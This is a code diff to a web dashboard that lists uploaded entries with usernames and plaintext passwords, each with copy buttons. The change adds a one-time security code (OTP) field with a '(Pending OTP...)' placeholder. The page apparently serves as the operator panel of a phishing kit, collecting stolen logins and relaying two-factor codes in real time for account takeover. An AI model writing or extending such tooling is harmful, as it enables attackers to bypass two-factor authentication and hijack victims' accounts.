@@ -247,7 +247,7 @@
       border: 1px solid var(--card-border);
       border-radius: 20px;
       padding: 24px;
-      height: 220px;
+      height: 290px;
       display: flex;
       flex-direction: column;
       gap: 16px;
@@ -360,14 +360,17 @@
         <div class="skeleton-line skeleton-badge"></div>
         <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
         <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
+        <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
       </div>
@@ -386,6 +389,7 @@
     const skeletonHTML = `
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
+        <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
         <div class="skeleton-line skeleton-field"></div>
       </div>
@@ -449,6 +453,7 @@
         data.forEach(entry => {
           const username = entry.data?.username || 'Anonymous';
           const password = entry.data?.password || '';
+          const otp = entry.data?.otp || '';
           const rawTimestamp = entry.data?.timestamp || entry.uploadedAt;
           const displayTime = formatDate(rawTimestamp);
 
@@ -458,6 +463,7 @@
           // Escape values for rendering, but preserve raw values for copying
           const escUsername = escapeHTML(username);
           const escPassword = escapeHTML(password);
+          const escOtp = escapeHTML(otp);
 
           card.innerHTML = `
             <div>
@@ -477,6 +483,13 @@
                   <div class="field-value-wrapper">
                     <span class="field-value">${escPassword}</span>
                     <button class="copy-btn" data-copy="${escapeAttribute(password)}">Copy</button>
+                  </div>
+                </div>
+                <div class="credential-field">
+                  <div class="field-label">Security Code (OTP)</div>
+                  <div class="field-value-wrapper">
+                    <span class="field-value">${escOtp || '<span style="color: var(--text-disabled); font-style: italic;">(Pending OTP...)</span>'}</span>
+                    ${otp ? `<button class="copy-btn" data-copy="${escapeAttribute(otp)}">Copy</button>` : ''}
                   </div>
                 </div>
               </div>
